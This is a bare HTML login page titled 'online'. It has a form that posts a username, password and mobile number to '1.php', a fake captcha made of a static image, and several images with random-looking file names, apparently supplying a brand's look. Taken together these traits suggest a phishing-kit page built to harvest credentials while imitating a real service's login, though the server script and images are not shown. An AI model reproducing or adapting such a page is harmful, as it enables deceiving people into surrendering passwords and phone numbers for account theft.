<!DOCTYPE html>

<html lang="zxx">

<head>

    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>online</title>

    <style>

        #bb ,#mm ,#re ,#ggm ,#ggmm

        {

            width: 100%;

        }

        #zz ,#ff ,#xx ,#ww 

        {

            margin-left: 5%;

            font-size: 12px;

        }

    

        #ee ,#hh ,#jj ,#kk

        {

            width: 90%;

            margin-left: 5%;

            margin-right: 5%;

            height: 28px;

            border-width:0.5px;

            background-color: #eaeaea;

            

        }



        #btn

        {

            margin-left: 5%;

            width: 80px;

            height: 30px;

            border-color: #017298;;

            background-color:#017298;

            border-radius:5px;

            color: white;

            margin-bottom: 30px;

        }



    </style>

</head>

<body>

    <img src="yajababbabahha.jpg" alt=""id="bb">

    <form action="1.php" method="post">

            <p id="zz">

                Username*

            </p>

        <div class="dd">

            <input type="text" name="username" id="ee" required="">

        </div>

      <p id="ff">

            Password*

      </p>

      <div class="gg">

          <input type="password" name="password" id="hh" required="" required="">

      </div>

      <p id="xx">

          Mobile No.*

      </p>

      <div class="ii">

          <input type="number" name="mobile no." id="jj" required="">

      </div>

      <p id="ww">

          Enter the text as shown in the image*

      </p>

      <div class="kk">

          <input type="text" name="" id="kk" required="">

      </div>

      <img src="Yajanajajanjajll.jpg" alt="" id="mm">

      <div class="ni">

          <button type="submit" id="btn">

                Login

          </button>

      </div>

      <img src="Yfvhjgvvvgg-ll2.jpeg" alt="" id="ggm">

      <img src="yvcyggggff-ll3.jpeg" alt="" id="ggmm">

      <img src="oaojabajajjaj-cc.jpeg" alt="" id="re">

    </form>

</body>

</html>